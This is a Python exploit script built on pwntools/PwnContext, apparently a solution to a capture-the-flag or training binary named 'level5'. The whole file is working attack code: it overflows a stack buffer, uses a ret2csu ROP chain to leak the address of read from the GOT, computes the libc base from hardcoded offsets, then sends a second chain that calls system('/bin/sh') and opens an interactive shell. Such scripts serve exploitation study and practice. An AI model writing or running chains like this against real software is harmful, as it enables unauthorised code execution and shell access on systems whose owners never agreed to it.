#!/usr/bin/env python
#coding=utf-8
from PwnContext import *
from IPython import embed as ipy
context.terminal = ['tmux', 'splitw', '-h'] 
s       = lambda data               :ctx.send(data)
sa      = lambda delim,data         :ctx.sendafter(delim, data) 
sl      = lambda data               :ctx.sendline(data) 
sla     = lambda delim,data         :ctx.sendlineafter(delim, data) 
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=False  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)

uu32    = lambda data   :u32(data.ljust(4, b'\x00'))
uu64    = lambda data   :u64(data.ljust(8, b'\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr)) # ]]

context.log_level = 'debug'
ctx.binary = './level5'
# 'libc_xxx':0x123, 'heap_xxx':0x123, 'xxx':0x123
ctx.symbols = {}
ctx.breakpoints = [0x400585] 
def ret2csu(call,edi,rsi,rdx):
        payload = p64(0x40061A)         # first call popper gadget
        payload += p64(0x00)            # pop rbx - set to 0 since it will be incremented later
        payload += p64(0x01)            # pop rbp - set to 1 so when compared to the incremented rbx results in equality
        payload += p64(call)            # pop r12 # call
        payload += p64(rdx)             # pop r13 #rdx
        payload += p64(rsi)             # pop r14 #rsi
        payload += p64(edi)             # pop r15 #edi
        payload += p64(0x400600)        # 2nd call caller gadget
        payload += p64(0x00)            # add rsp,0x8 padding
        payload += p64(0x00)            # rbx
        payload += p64(0x00)            # rbp
        payload += p64(0x00)            # r12
        payload += p64(0x00)            # r13
        payload += p64(0x00)            # r14
        payload += p64(0x00)            # r15
        return payload
rs()
# dbg()
# pause()
sla('orld\n', b'a'*0x88+ret2csu(ctx.binary.got['write'], 1, ctx.binary.got['read'], 8)+p64(0x400587))
read = uu64(r(8))
libc_base = read-0xf7000
system = libc_base+0x493d0
bin_sh = libc_base+0x198031
lg("libc_base", libc_base)
sla("orld\n", b'a'*0x88+p64(0x0000000000400419)+p64(0x0000000000400623)+p64(bin_sh)+p64(system))

irt()
